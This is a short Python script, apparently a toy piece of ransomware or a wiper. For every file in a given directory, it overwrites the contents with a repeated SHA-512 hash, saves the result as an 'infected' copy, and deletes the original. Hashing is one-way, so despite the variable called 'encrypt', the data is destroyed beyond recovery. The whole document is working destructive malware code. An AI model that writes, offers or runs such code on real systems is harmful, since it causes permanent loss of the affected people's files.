import hashlib
import os

diretorio= "E:\Exemplo"

for files in os.listdir(diretorio):
    os.chdir(diretorio)
    with open(files, 'rb') as rb:
        dados = rb.read()
        criptografar = hashlib.sha512(dados).hexdigest()
        novo_arquivo= 'infected '+ os.path.basename(files)
        with open(novo_arquivo, 'wb') as novo:
            byte = bytes(criptografar, encoding='utf-8')
            novo.write(byte*0xFF)
            novo.close()
            rb.close()
            
            os.remove(files)